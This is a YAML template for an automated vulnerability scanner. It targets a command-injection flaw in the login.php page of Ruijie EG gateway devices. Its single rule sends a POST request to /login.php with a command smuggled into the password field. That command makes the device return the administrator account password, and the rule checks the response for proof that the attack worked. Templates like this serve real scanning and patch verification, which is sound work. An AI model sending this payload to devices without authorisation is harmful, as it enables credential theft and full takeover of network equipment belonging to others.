name: Ruijie_EG_login.php_rce
transport: http
set: {}
detail:
  dock: app="Ruijie-EG"
  product: Ruijie-EG
  homepage: http://www.ruijie.com.cn/
  impact: ''
  description: Attackers can use sandbox commands to obtain administrator account
    passwords, log in to the system, execute commands, and control the entire device.
rules:
  r1:
    method: POST
    path: /login.php
    follow_redirects: false
    headers:
      Content-Type: application/x-www-form-urlencoded
      X-Requested-With: XMLHttpRequest
    body: username=admin&password=admin?show+webmaster+user
    expression: response.status == 200 && response.body.bcontains(b'"data":"WORD') &&
      response.body.bcontains(b'"status":1')
expression: r1()
